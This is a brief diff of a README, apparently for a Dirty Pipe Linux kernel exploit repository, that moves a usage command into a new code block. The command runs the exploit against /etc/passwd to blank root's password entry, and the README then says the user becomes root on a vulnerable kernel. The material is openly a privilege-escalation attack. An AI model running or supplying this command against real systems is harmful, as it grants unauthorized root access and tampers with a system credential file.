@@ -18,9 +18,11 @@ git clone https://github.com/nekoox/dirty-pipe.git
 
 ```bash
 cd dirty-pipe
-
-./exploit /etc/passwd 1 "${$(cat /etc/passwd)/root:x/oot:}"
 ```
+
+````bash
+./exploit /etc/passwd 1 "${$(cat /etc/passwd)/root:x/oot:}"
+````
 
 3. Once run, if the kernel version is vulnerable, it should work fine. We change to root.
 
